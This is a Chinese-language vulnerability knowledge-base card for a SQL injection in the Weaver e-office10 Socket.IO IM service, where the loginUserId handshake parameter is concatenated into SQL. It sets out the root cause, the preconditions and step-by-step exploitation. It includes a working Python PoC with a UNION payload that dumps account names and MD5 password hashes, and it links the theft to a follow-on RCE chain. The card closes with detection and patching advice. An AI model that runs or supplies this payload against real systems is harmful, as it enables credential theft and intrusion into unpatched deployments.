---
id: web-generic-sqli-weaver-eoffice10-im-socketio-loginuserid-union
title: 泛微 e-office10 IM 服务 Socket.IO 握手 loginUserId 拼接 SQL：outline recordLength 事件 UNION 回显账号口令
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-eoffice10-im-socketio-loginuserid-union-sqli
tags:
- nodejs
- socketio
- sqli
- union
- mysql
- weaver
- eoffice
- credential
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V637
  verified_at: '2026-11-13T01:28:04+08:00'
  notes: 已对照原文与17张截图逐项核对：4986/node server.js 定位（02）、connectToSocket 取 handshake.query（05）、io.of('/web')（06）、outline recordLength 触发 getPersonalOfflineRecord（04）、chat_personal_record_0..3 前置（08）、userId 拼接 SQL 与 send recordLength 回显（08/09）、payload 与 exp 回显账号~MD5（内容与10截图一致）、getPersonalOfflineRecord 补丁新增 customEscape（03）。原文未标注具体受影响版本，affected_versions 保持空。dedup 仅命中草稿自身（库内已有同一卡），其余候选为 e-cology/e9/E10 等不同注入点，非同链；dup-scan 未涉及。未验证点：PoC 未在本机执行；welink-move 请求鉴权方式原文未显式给出（仅 desc-langs 明示带 Authorization）。
url: /docs/web/generic/sqli/web-generic-sqli-weaver-eoffice10-im-socketio-loginuserid-union/
draft: false
kb_aliases:
- 泛微 e-office10 SQL 注入
- e-office IM SQL 注入
- Socket.IO loginUserId 注入
- getPersonalOfflineRecord 注入
- outline recordLength
- chat_personal_record 注入
---

## 一句话结论

泛微 e-office10 的即时通讯服务（Node.js + Socket.IO，默认 4986 端口、namespace `/web`）把握手 query 里的 `loginUserId`、`loginDeptId`、`loginRoleId` 原样带入业务逻辑；连接后发送 `outline recordLength` 事件会触发 `getPersonalOfflineRecord`，其中 `loginUserId` 被直接拼进“个人离线消息”查询的 SQL，用 `aa",`chat_object`) union select ... from user#` 闭合后即可经 `send recordLength` 事件回显 `user_accounts` 与 `password`（MD5）等数据，为后台登录和后续文件包含 RCE 提供凭据。

## 原理

- **服务形态**：e-office10 的 IM 服务由 `C:\...\eoffice10\server\nodejs\server.js` 提供，监听 4986；`netstat -ano` 可见 node.exe 监听，`wmic process ... get CommandLine` 可确认 server.js 路径。服务端用 socket.io 注册 namespace `/web`：
  `let socketWeb = io.of('/web').on('connection', connectToSocket('socketWeb'))`
- **握手参数被信任**：`connectToSocket` 中 `const { loginUserId, loginDeptId, loginRoleId } = socket.handshake.query;`——这些值来自 URL query，攻击者可任意构造。
- **触发与汇入**：`socket.on('outline recordLength', function () { ... personalRecord.getPersonalOfflineRecord(loginUserId, socket); })`。`getPersonalOfflineRecord(userInfo, socket)` 先查询 `INFORMATION_SCHEMA.TABLES` 中 `chat_personal_record%` 表名，再用 `userInfo` 拼出多条个人消息查询：
  `SELECT * FROM <recordId> WHERE haveread = 0 AND FIND_IN_SET('userInfo', 'chat_object') AND creator != 'userInfo' UNION ...`
  这里只做字符串拼接；补丁 diff 在函数入口新增 `const userInfo = customEscape(userInfo);`，说明修复方式就是转义，漏洞版本没有该转义。
- **前置表条件**：代码只有在表名数组中存在 `chat_personal_record_0`、`_1`、`_2`、`_3` 时才会继续构造 SQL（默认库只有 `chat_personal_record`）。攻击者先注册/新建若干账号并互发几条消息，即可让系统创建这些分表；这也是该注入"能打到但默认打不到"的关键条件。
- **注入与回显**：`userInfo` 位于 SQL 单引号内，payload `aa",`chat_object`) union select 1,2,3,group_concat(user_accounts,0x7e,password,0x7e),5,6,0,8,9,10,11,12 from user#` 利用双引号/反引号闭合上下文并注释掉后续条件，UNION 查询 `user` 表；处理结果时 `socket.emit('send recordLength', recordLength)` 把按 `chat_object` 统计的数据回发给客户端，UNION 行的第 4 列（`group_concat`，用 `~` 分隔）即账号与 MD5 口令。
- **为什么可行**：Node.js 的 MySQL 客户端允许字符串拼接 SQL；鉴权只绑定握手参数而不校验其内容；IM 服务与 PHP 后台共用数据库/账号体系，口令为 `md5(unix)` 形式，可离线爆破后用于后台登录。

## 触发条件

- 目标暴露泛微 e-office10 IM 服务（默认 4986），socket.io namespace `/web` 可连接。
- 客户端库版本兼容：原文说明需 `python-engineio==3.14.2` + `python-socketio==4.6.0`，否则报 `OPEN packet not returned by server`。
- 数据库已存在 `chat_personal_record_0` 至 `_3` 分表（默认不存在，需先新建账号互发消息生成）。
- 后端为 MySQL，`user` 等表与 IM 库同库可 UNION；能收到 `send recordLength` 事件回显。
- 目标未修复（函数入口无 `customEscape`）。

## 利用步骤

1. 探测 4986 端口与 node.exe 命令行，确认 e-office10 IM 服务与 server.js 路径。
2. 安装兼容客户端库并连接 `/web` namespace，query 带任意 `loginUserId`/`loginDeptId`/`loginRoleId`：
   `http://<host>:4986?loginUserId=admin&loginDeptId=0&loginRoleId=1`
3. 若目标尚无 `chat_personal_record_0..3` 表：先注册/创建多个账号并互发消息，让系统生成分表。
4. 连接后 `emit('outline recordLength', None)` 触发查询；正常时应收到 `send recordLength` 回显。
5. 把 `loginUserId` 替换为 UNION 注入 payload，重新连接并触发，解析回显中的 `账号~MD5`。
6. 对 MD5 做离线爆破，用命中口令登录 PHP 后台获取 `Authorization: Bearer <JWT>`，进入后续利用（如 welink 上传 + lang 文件包含 RCE）。

## PoC

```python
import socketio

sio = socketio.Client()

@sio.on('connect', namespace='/web')
def connect():
    print('Connected to the server')
    sio.emit('outline recordLength', None, namespace='/web')

@sio.on('send recordLength', namespace='/web')
def on_message(data):
    print('Received data: ' + str(data))

payload = 'aa",`chat_object`) union select 1,2,3,group_concat(user_accounts,0x7e,password,0x7e),5,6,0,8,9,10,11,12 from user#'
url = 'http://192.168.0.139:4986?loginUserId=' + payload + '&loginDeptId=0&loginRoleId=1'
sio.connect(url, namespaces=['/web'])
try:
    sio.wait()
except KeyboardInterrupt:
    pass
finally:
    sio.disconnect()
```

说明：以上为原文 exp 的结构化复现，未在本机执行；仅用于授权测试。返回示例为 `admin-11$<md5>~test-2$<md5>~test-3$<md5>` 形式的账号与 MD5 口令串。

## 变体与关联

- **注入点变体**：`loginDeptId`、`loginRoleId` 同样来自握手 query，若后续逻辑也拼接 SQL 可一并尝试；同类个人消息查询在多张 `chat_personal_record_N` 分表上重复拼接，任一表查询均可注。
- **前置条件变体**：若目标已有多账号使用记录，分表条件自然满足；否则需先制造聊天数据。
- **回显通道变体**：除 `send recordLength` 外，可观察 `addLog` 等事件/服务端日志是否带出 SQL 错误；UNION 列数需按实际表结构调整（原文为 13 列，第 4 列回显）。
- **关联**：[[web-generic-file-upload-weaver-eoffice10-welink-move-php-lang-include-rce]]（本卡泄露的后台口令用于其上传/包含链）、[[web-generic-sqli-weaver-e10-logmanager-arthasport-searchinput]]（同为泛微产品的 SQL 拼接注入，但目标为 E10 运维平台，注入点/组件不同）、[[web-generic-sqli-weaver-e9-doc-out-more-list-boolean-blind]]（泛微 e9 注入，可对比产品线）。
- **边界**：IM 服务未启动/端口不可达、分表未创建且无法制造、数据库不同库、MySQL 客户端禁用多语句/UNION 关键字过滤严格时，本链需调整或失败。

## 检测与防御

- **修复**：所有 SQL 使用参数绑定/预编译，禁止字符串拼接；对 `loginUserId` 等握手参数做类型与字符白名单校验（仅允许数字/固定格式）；恢复并强制 `customEscape` 仅作为纵深防御。
- **加固**：Socket.IO 连接前做身份校验（token），不只信任 query；数据库账号最小权限（IM 账号不需要 `user` 表读权限）；及时升级 e-office10 到修复版本。
- **检测**：监控 4986 端口的 Socket.IO 连接中 `loginUserId` 含引号/反引号/`union`/`#`/`0x7e` 等特征；审计 Node.js 的 SQL 错误日志与 `FIND_IN_SET` 异常语句；关注短时间内大量新建账号/互发消息制造分表的行为。
- **响应**：确认注入后轮换后台账号口令、检查 `user` 表是否被批量读取，并排查是否进一步发生文件上传/包含行为。
